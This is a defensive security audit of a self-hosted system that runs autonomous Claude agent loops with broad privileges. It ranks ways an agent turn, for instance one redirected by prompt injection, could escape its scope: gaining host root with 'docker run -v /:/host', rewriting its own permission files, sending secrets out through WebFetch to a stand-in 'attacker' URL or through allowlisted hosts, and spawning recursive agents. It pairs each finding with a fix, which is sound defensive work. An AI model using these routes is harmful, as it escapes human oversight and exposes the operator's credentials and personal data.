# Security Audit — Workshop in-app agent / autonomy isolation — 2026-07-18

Read-only companion to `security-audit-2026-07-18.md` (which covered host/network/web/mobile). This
pass looks *inward*: what an executing agent turn can do within its scope, and how well that is
isolated from the rest of the filesystem, other Workshop apps/projects, the operator's personal
data, and the host. Per the operator's request, findings are split into **clear issues** and
**ambiguous design questions** (product decisions), because much of agent capability is deliberate.

## The core reality

Every autonomous turn — `ralph.sh`, `project_ralph.sh`, `queue_runner.sh`, `cron_agent.sh`, and the
`/tools` recursive-claude tools — invokes the **same `claude -p`** the operator's interactive
sessions use, inheriting `~/.claude/settings.json` (`defaultMode: auto`, `skipAutoPermissionPrompt:
true`, no `--allowedTools` restriction). It runs **as `the service user`, in the `docker` group, with no
sandbox** (no container, bwrap, seccomp, restricted PATH, or working-dir jail; the backend service
has no `User=`), holding the OAuth token and full read/write of the tree.

The entire enforcement perimeter is: two PreToolUse **Bash-only** hooks (`egress-guard.py`,
`git-guard.py`) plus the Anthropic-side auto-mode classifier. **An agent turn can reach everything
the service user can reach.** So the in-app "boundaries" below are only as strong as that perimeter — and
against a same-uid, docker-group process, most are not OS-enforced at all.

This matters because the autonomy loop ingests **untrusted content** (Discord messages, web pages,
task text). The single-operator trust model is internally consistent — but prompt injection does not
respect the single-user assumption.

---

## Clear issues (ranked)

### A1 — CRITICAL — Agent Bash = unguarded host root (via docker group)
Same root cause as `security-audit-2026-07-18.md` C1, from the execution side. `/var/run/docker.sock`
is `srw-rw---- root docker`; agent turns run in the `docker` group; **no hook inspects `docker`**
(the egress guard watches `curl|wget|nc|…`, not `docker`). One Bash call — `docker run -v /:/host …`
— makes an injected or misbehaving turn host root, reading every credential in `~/.config/clawdbot/*`
and all `.runtime/users/*` personal data. The docker dependency is real (`container_runtime.py` runs
app containers), so the fix is the C1 architectural one: **socket-proxy or rootless docker + a
lower-privilege execution identity for the autonomy loop** (a dedicated sub-user without the docker
group), not a naive group removal. This is the single highest-leverage change; everything below is
downstream of it.

### A2 — HIGH — `touches` / `latitude` / `grants` are advisory, and the agent can rewrite them
These read like a confinement system; they are not.
- **`touches`** is a *post-hoc* detective check on the committed git diff (`project_ralph.sh:900-914`
  → `tasks.enforce_touches`, `tasks.py:560`). It runs *after* the turn, only blocks marking the task
  done, and sees only files inside the git repo — writes to other projects, `.runtime/users`,
  `~/.config`, or via subprocess/network are invisible. Default `touches: []` = unrestricted, which
  is every task today. The code says so: *"read by NOTHING… not a permission system"* (`tasks.py:452`).
- **`latitude`** is explicitly *"ADVISORY policy above the enforced floor… never widens the floor"*
  (`latitude.py:20`).
- **`grants`/`stores`** bind only code that voluntarily calls `services.stores.read/write`
  (`permissions.py:7` "CONSULTED source of truth, NOT a wall… there is no middleware"). A Bash `cat`
  bypasses them.
- **Self-escalation:** `.tasks.json`, `.runtime/projects.json`, `grants.json`, and `agents/*.md` are
  all writable by the agent (same uid). It can widen its own `touches`, flip a project's
  `sensitivity` (which unlocks egress — A3), or edit its own definition.

Perms don't fix this — the agent is the same uid, so `chmod` is theater here; the churny registries
are also atomically rewritten (mode reverts). **The honest remediation is documentation + A1:** stop
representing scope/touches/latitude/grants as a security boundary (they are correctness/coordination),
and get real confinement from a lower-privilege execution identity. Do not invest in hardening
`touches` into a "wall" while single-uid + docker make it unenforceable.

### A3 — HIGH — Exfil channels remain open despite the egress guard
The egress guard claims to close the "external communication" leg of the lethal trifecta, but:
- **WebFetch / WebSearch are entirely uncovered** — the hook matches `Bash` only. The guard's own
  error text even redirects agents to WebFetch. `WebFetch("https://attacker/?d=<secret>")`
  exfiltrates freely.
- **Hostname-only, no payload inspection:** it decides on `urlparse().hostname`, so
  `curl https://<allowed-host>/?leak=<secret>` passes.
- **Private build context fails open:** in a `cwd` under `projects/*` with `sensitivity=private`
  (the default) it allows all external shell egress (`egress-guard.py:193`).
- **Fails open on any parse error** (`:180`).
- **Recommendation (completes an existing control, not new cruft):** add a PreToolUse matcher for
  **WebFetch** applying the same host policy and rejecting data-bearing query strings to
  non-allowlisted hosts. NOTE: `egress-guard.py` is user-scope and shared with the chat bridge —
  change it carefully and test both surfaces; do not narrow legitimate research fetches.

### A4 — MEDIUM — Recursive `claude` spawn with no recursion / token budget
`/tools/cloud_run_claude` and `cloud_run_ralph` (`cloud.py:79-171`) shell out to full agentic
`claude -p` turns (Bash included). `max_turns` and `model` (incl. `opus`) are **caller-supplied with
no clamp**; the only bound is a per-call timeout. No depth counter, concurrency cap, or token budget.
`/tools` is gated by network origin only (loopback + docker bridge, no identity), so any local/on-
bridge process — including an agent's own loopback `curl` — can invoke it, and an agent can also call
`claude -p` directly in Bash (bypassing the sweep's `usage_ledger` budget gate entirely). Realistic
impact: unbounded fan-out / token burn from one injected turn. **Recommendation:** clamp `max_turns`
(and disallow arbitrary `model`) server-side in `cloud.py`, add a simple depth/concurrency guard.
Cost-control, not multi-tenant gating.

### A5 — MEDIUM — Personal-data partition is app-layer only
`.runtime/users/{1,6,1003}/` holds Plaid, ~1.6 MB GPS `location.jsonl`, `health.jsonl`, `budget.json`.
The per-owner partition is a Python contextvar (fail-closed at the API), but the files are one uid,
so a Bash `cat` from any agent turn reads every owner's data regardless of the API gate. Same root
cause as A1 (same-uid execution); perms don't help against a same-uid agent. Fixed by A1's execution-
identity separation, not by file modes.

### A6 — LOW–MEDIUM — App containers run unconfined
`compose_gen.py:209-216` emits no `user`, `cap_drop`, `read_only`, or `security_opt:
no-new-privileges`, and bind-mounts the app source **read-write**. A compromised app container is
host-root via the socket anyway (A1). Env scoping is otherwise **good**: each app gets only its
slug's secrets via a `0600` `env_file`, isolated from other apps and from personal data.
**Recommendation (when A1 is addressed):** add `no-new-privileges`, `cap_drop: [ALL]`, and a non-root
`user` to generated app compose files as defense-in-depth.

---

## Design questions (product decisions, not bugs)

- **The central decision:** the system intentionally runs autonomous, untrusted-input turns with the
  operator's full privileges + OAuth token + docker-root, gated only by two Bash hooks + the
  classifier. The code is candid that scope/grants/touches are *"correctness, not a permission wall
  in this single-operator system."* That is coherent for a trusted user — but prompt injection breaks
  the single-user assumption. **Decide:** is the untrusted-input autonomy surface worth a real
  execution boundary (a dedicated lower-priv sub-user without docker, or rootless containers), or is
  the classifier + egress hook an accepted residual risk? A1 is what makes this urgent, not academic.
- **The completion gate is a quality control, not a security control.** `reviewer.sh` checks
  stubs/typecheck/design-lint/criteria on the *committed diff*; it never inspects the turn's Bash
  actions for exfil or dangerous commands, and runs only after side effects. State this plainly so it
  isn't mistaken for a safety gate.
- **`git push` to project remotes is allowed** (`git-guard.py` blocks only force / protected-branch /
  remote-repoint / history-rewrite). For a bound project, an injected agent can push a non-protected
  branch to the real remote — an action/exfil channel worth acknowledging.
- **Auto-commit net:** now correctly scoped (commits only `touches`-matched paths, or only newly-
  created untracked files, via `git commit --only`). The past concurrent-editor clobber is addressed;
  not a current vuln.

## Real boundaries vs. not (summary)

- **Real, OS-enforced:** container *network* isolation; per-app `0600` env-file secret scoping; the
  `0600` perms on `auth.env`/`plaid-tokens.json`/`jwt-secret`/`auth.db` — but only against *other
  unix users*, not against a same-uid agent turn.
- **NOT a boundary against an agent turn:** scope / `touches` / `latitude` / `grants` / `stores`
  (advisory, in-process, self-editable); the per-owner data partition (contextvar); cross-project /
  cross-app separation (single uid) — and, because of the docker group, all of them collapse to host
  root in one Bash call.

**Highest-value action:** A1 (give the autonomy loop a real, lower-privilege execution identity and
take docker-root off the agent path). **Cheapest defense-in-depth:** A3 (extend the egress guard to
WebFetch), closing a gap the guard already claims to cover.
